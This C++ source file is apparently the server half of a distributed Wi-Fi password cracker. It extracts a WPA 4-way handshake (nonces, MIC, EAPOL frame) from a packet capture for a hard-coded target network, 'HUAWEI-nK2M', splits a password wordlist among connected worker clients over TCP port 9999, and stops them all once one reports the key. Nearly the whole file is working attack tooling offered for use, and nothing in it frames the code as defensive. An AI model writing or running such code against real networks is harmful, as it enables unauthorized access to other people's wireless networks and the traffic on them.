#define _CRT_SECURE_NO_WARNINGS
#include <pcap.h>
#include <iostream>
#include <iomanip>
#include <sstream>
#include <fstream>
#include <vector>
#include <string>
#include <unordered_map>
#include <stdexcept>
#include <thread>
#include <mutex>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <openssl/sha.h>
#include <openssl/hmac.h>
#include <openssl/evp.h>
#include <algorithm>
#pragma comment(lib, "ws2_32.lib")

using ByteVector = std::vector<uint8_t>;

std::mutex client_list_mutex;
std::vector<SOCKET> client_sockets;

std::mutex global_mutex;
bool password_found = false;
std::string found_password;

std::string bytesToHexString(const ByteVector& data) {
    std::ostringstream oss;
    for (auto b : data)
        oss << std::hex << std::setw(2) << std::setfill('0') << (int)b;
    return oss.str();
}

std::string macBytesToString(const ByteVector& mac) {
    std::ostringstream oss;
    for (size_t i = 0; i < mac.size(); ++i) {
        if (i > 0) oss << ":";
        oss << std::hex << std::setw(2) << std::setfill('0') << (int)mac[i];
    }
    return oss.str();
}

ByteVector parseMacString(const std::string& macStr) {
    ByteVector mac(6);
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
    return mac;
}

struct Packet {
    ByteVector eapolPayload;
    std::string addr1, addr2, ssid;
    bool isEAPOL = false, isBeacon = false, isProbeResp = false;
};

struct HandshakeParameters {
    ByteVector ap_mac, client_mac, anonce, snonce, captured_mic, eapol_frame;
    std::string ssid;
};

int get80211HeaderLen(const uint8_t* dot11) {
    bool toDS = dot11[1] & 0x01;
    bool fromDS = dot11[1] & 0x02;
    bool qos = dot11[0] & 0x80;
    return 24 + (toDS && fromDS ? 6 : 0) + (qos ? 2 : 0);
}

bool parseCapturedPacket(const uint8_t* packet, uint32_t caplen, Packet& pkt) {
    if (caplen < 32) return false;
    const uint8_t* dot11 = packet;
    uint8_t type = (dot11[0] >> 2) & 0x03;
    uint8_t subtype = (dot11[0] >> 4) & 0x0F;

    pkt.addr1 = macBytesToString(ByteVector(dot11 + 4, dot11 + 10));
    pkt.addr2 = macBytesToString(ByteVector(dot11 + 10, dot11 + 16));

    if (type == 0 && (subtype == 8 || subtype == 5)) {
        pkt.isBeacon = (subtype == 8);
        pkt.isProbeResp = (subtype == 5);
        uint32_t pos = 36;
        while (pos + 2 <= caplen) {
            uint8_t tagID = dot11[pos], tagLen = dot11[pos + 1];
            pos += 2;
            if (pos + tagLen > caplen) break;
            if (tagID == 0) {
                pkt.ssid = std::string(reinterpret_cast<const char*>(dot11 + pos), tagLen);
                break;
            }
            pos += tagLen;
        }
        return true;
    }
    else if (type == 2) {
        int hdrLen = get80211HeaderLen(dot11);
        if (caplen < hdrLen + 8) return false;
        const uint8_t* llc = dot11 + hdrLen;
        if (llc[6] == 0x88 && llc[7] == 0x8e) {
            pkt.isEAPOL = true;
            pkt.eapolPayload = ByteVector(llc + 8, dot11 + caplen);
            return true;
        }
    }
    return false;
}

HandshakeParameters extractHandshakeParameters(const std::string& cap_file, const std::string& target_ssid) {
    std::cout << "[*] Opening capture file: " << cap_file << "\n";
    std::unordered_map<std::string, std::string> ssid_to_bssid;
    std::vector<Packet> eapolPackets;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_offline(cap_file.c_str(), errbuf);
    if (!handle) throw std::runtime_error("Error opening pcap file.");

    std::cout << "[*] Parsing packets to find SSID and EAPOL frames...\n";
    pcap_pkthdr* header;
    const u_char* packet;
    while (pcap_next_ex(handle, &header, &packet) >= 0) {
        Packet pkt;
        if (parseCapturedPacket(packet, header->caplen, pkt)) {
            if ((pkt.isBeacon || pkt.isProbeResp) && !pkt.ssid.empty())
                ssid_to_bssid[pkt.ssid] = pkt.addr2;
            if (pkt.isEAPOL)
                eapolPackets.push_back(pkt);
        }
    }
    pcap_close(handle);

    auto it = ssid_to_bssid.find(target_ssid);
    if (it == ssid_to_bssid.end())
        throw std::runtime_error("Target SSID not found in capture.");

    std::string bssid = it->second;
    std::cout << "[*] Found BSSID for SSID '" << target_ssid << "': " << bssid << "\n";

    Packet* m1 = nullptr, * m2 = nullptr;
    for (auto& pkt : eapolPackets) {
        if (!m1 && pkt.addr2 == bssid) {
            m1 = &pkt;
            std::cout << "[*] Captured M1 from AP → client\n";
        }
        else if (m1 && pkt.addr1 == bssid && pkt.eapolPayload.size() >= 97) {
            bool micnz = false;
            for (size_t i = 81; i < 97; ++i)
                if (pkt.eapolPayload[i]) { micnz = true; break; }
            if (micnz) {
                m2 = &pkt;
                std::cout << "[*] Captured M2 from client → AP\n";
                break;
            }
        }
    }
    if (!m1 || !m2) throw std::runtime_error("Incomplete 4-way handshake.");

    ByteVector eapol_copy = m2->eapolPayload;
    std::fill(eapol_copy.begin() + 81, eapol_copy.begin() + 97, 0);

    std::cout << "[+] Handshake extracted successfully\n";
    return {
        parseMacString(m1->addr2),
        parseMacString(m1->addr1),
        ByteVector(m1->eapolPayload.begin() + 17, m1->eapolPayload.begin() + 49),
        ByteVector(m2->eapolPayload.begin() + 17, m2->eapolPayload.begin() + 49),
        ByteVector(m2->eapolPayload.begin() + 81, m2->eapolPayload.begin() + 97),
        std::move(eapol_copy),
        target_ssid
    };
}

void sendHandshakeAndChunk(SOCKET sock,
    const HandshakeParameters& hp,
    const std::vector<std::string>& chunk)
{
    std::cout << "[*] Sending handshake + " << chunk.size() << " passwords to client socket " << sock << "\n";
    auto sendVector = [&](const ByteVector& v) {
        uint32_t s = v.size();
        send(sock, (char*)&s, sizeof(s), 0);
        send(sock, (char*)v.data(), s, 0);
        };

    sendVector(hp.ap_mac);
    sendVector(hp.client_mac);
    sendVector(hp.anonce);
    sendVector(hp.snonce);
    sendVector(hp.captured_mic);
    sendVector(hp.eapol_frame);

    uint32_t ssid_len = hp.ssid.size();
    send(sock, (char*)&ssid_len, sizeof(ssid_len), 0);
    send(sock, hp.ssid.c_str(), ssid_len, 0);

    std::ostringstream oss;
    for (auto& pw : chunk) oss << pw << '\n';
    std::string all = oss.str();
    uint32_t total = all.size();
    send(sock, (char*)&total, sizeof(total), 0);
    send(sock, all.c_str(), total, 0);
}

void broadcastStop() {
    const char STOP_CMD[] = "STOP";
    std::lock_guard<std::mutex> lk(client_list_mutex);
    std::cout << "[*] Broadcasting STOP to all clients\n";
    for (auto s : client_sockets) {
        send(s, STOP_CMD, sizeof(STOP_CMD) - 1, 0);
    }
}

void handleClient(SOCKET client_socket,
    const HandshakeParameters& hp,
    const std::vector<std::string>& chunk)
{
    {
        std::lock_guard<std::mutex> lk(client_list_mutex);
        client_sockets.push_back(client_socket);
    }

    std::cout << "[*] Thread " << std::this_thread::get_id()
        << " starting for socket " << client_socket << "\n";

    sendHandshakeAndChunk(client_socket, hp, chunk);

    char buf[1024];
    while (true) {
        {
            std::lock_guard<std::mutex> lk(global_mutex);
            if (password_found) break;
        }
        int n = recv(client_socket, buf, sizeof(buf), 0);
        if (n <= 0) break;
        buf[n] = '\0';

        if (std::string(buf).rfind("FOUND:", 0) == 0) {
            {
                std::lock_guard<std::mutex> lk(global_mutex);
                password_found = true;
                found_password = std::string(buf + 6);
                std::cout << "\n[+] Password FOUND by thread " << std::this_thread::get_id()
                    << ": " << found_password << "\n";
            }
            broadcastStop();
            break;
        }
    }

    std::cout << "[*] Thread " << std::this_thread::get_id()
        << " exiting\n";
    closesocket(client_socket);
}

void startServer(const std::string& cap_file,
    const std::string& ssid,
    const std::string& wordlist_file,
    int expected_clients)
{
    std::cout << "[*] Initializing Winsock...\n";
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        throw std::runtime_error("WSAStartup failed.");

    SOCKET srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv == INVALID_SOCKET)
        throw std::runtime_error("Socket creation failed.");

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(9999);
    bind(srv, (sockaddr*)&addr, sizeof(addr));
    listen(srv, expected_clients);

    std::cout << "[*] Listening on port 9999, waiting for " << expected_clients << " clients...\n";

    auto hp = extractHandshakeParameters(cap_file, ssid);

    std::cout << "\n=== Handshake Parameters ===\n"
        << "AP MAC      : " << bytesToHexString(hp.ap_mac) << "\n"
        << "Client MAC  : " << bytesToHexString(hp.client_mac) << "\n"
        << "ANonce      : " << bytesToHexString(hp.anonce) << "\n"
        << "SNonce      : " << bytesToHexString(hp.snonce) << "\n"
        << "Captured MIC: " << bytesToHexString(hp.captured_mic) << "\n"
        << "SSID        : " << hp.ssid << "\n"
        << "=============================\n";

    std::cout << "[*] Loading wordlist from: " << wordlist_file << "\n";
    std::ifstream wordlist(wordlist_file);
    if (!wordlist.is_open())
        throw std::runtime_error("Failed to open wordlist.");

    std::vector<std::string> passwords;
    for (std::string line; std::getline(wordlist, line); )
        if (!line.empty()) passwords.push_back(line);
    std::cout << "[*] Loaded " << passwords.size() << " passwords\n";

    int chunk_size = passwords.size() / expected_clients;
    std::vector<std::thread> threads;

    for (int i = 0; i < expected_clients; ++i) {
        SOCKET cli;
        sockaddr_in cliAddr{};
        int len = sizeof(cliAddr);
        cli = accept(srv, (sockaddr*)&cliAddr, &len);
        if (cli == INVALID_SOCKET)
            throw std::runtime_error("Accept failed.");

        int start = i * chunk_size;
        int end = (i + 1 == expected_clients) ? passwords.size() : start + chunk_size;
        std::cout << "[*] Client " << (i + 1)
            << " connected. Assigned passwords [" << start
            << " - " << (end - 1) << "]\n";

        threads.emplace_back(handleClient, cli, hp,
            std::vector<std::string>(passwords.begin() + start,
                passwords.begin() + end));
    }

    for (auto& th : threads) th.join();

    std::cout << "[*] All threads joined. ";
    if (password_found)
        std::cout << "Password was found: " << found_password << "\n";
    else
        std::cout << "Password was NOT found in wordlist.\n";

    closesocket(srv);
    WSACleanup();
    std::cout << "[*] Server shutdown complete.\n";
}

int main() {
    try {
        startServer("hammm1-07.cap", "HUAWEI-nK2M", "T3.txt",2);
    }
    catch (const std::exception& ex) {
        std::cerr << "ERROR: " << ex.what() << "\n";
        return 1;
    }
    return 0;
}

